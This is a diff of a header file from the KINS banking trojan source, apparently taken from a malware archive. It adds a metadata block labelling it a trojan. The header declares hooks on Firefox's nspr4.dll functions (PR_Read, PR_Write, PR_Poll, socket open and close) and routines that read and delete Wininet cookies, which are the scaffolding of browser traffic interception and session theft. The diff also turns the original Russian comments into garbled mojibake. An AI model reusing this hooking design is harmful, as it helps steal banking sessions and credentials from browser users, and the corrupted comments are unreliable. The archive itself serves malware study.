@@ -1,5 +1,16 @@
 /*
-  Перехват nspr4.dll
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
+/*
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ nspr4.dll
 */
 #pragma once
 
@@ -25,33 +36,33 @@ typedef struct
 namespace Nspr4Hook
 {
 	/*
-		Инициализация.
+		пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
 	*/
 	void init(void);
 
 	/*
-		Деинициализация.
+		пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	*/
 	void uninit(void);
 
 	/*
-		Получение куков Wininet.
+		пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Wininet.
 	*/
 	void _getCookies(void);
 
 	/*
-		Удаление куков Wininet.
+		пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Wininet.
 	*/
 	void _removeCookies(void);
 
 	/*
-		Установка адерсов оригинальных функций. Функция должна вызываться в процессе ОДИН РАЗ.
+		пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
 
-		IN module       - модуль.
-		IN readAddress  - адрес оригинальной PR_Read.
-		IN writeAddress - адрес оригинальной PR_Write.
-		IN pollAddress  - адрес оригинальной PR_Poll.
+		IN module       - пїЅпїЅпїЅпїЅпїЅпїЅ.
+		IN readAddress  - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PR_Read.
+		IN writeAddress - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PR_Write.
+		IN pollAddress  - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PR_Poll.
 	*/
 	void updateAddresses(HMODULE moduleHandle, void *openTcpSocket, void *close, void *readAddress, void *writeAddress, void *pollAddress);
 
@@ -61,17 +72,17 @@ namespace Nspr4Hook
 	void *__cdecl hookerPrOpenTcpSocket(int af);
 
 	/*
-		Перехватчик PR_Close.
+		пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PR_Close.
 	*/
 	int __cdecl hookerPrClose(void *fd);
 
 	/*
-		Перехватчик PR_Read.
+		пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PR_Read.
 	*/
 	__int32 __cdecl hookerPrRead(void *fd, void *buf, __int32 amount);
 
 	/*
-		Перехватчик PR_Write.
+		пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ PR_Write.
 	*/
 	__int32 __cdecl hookerPrWrite(void *fd, const void *buf, __int32 amount);
 
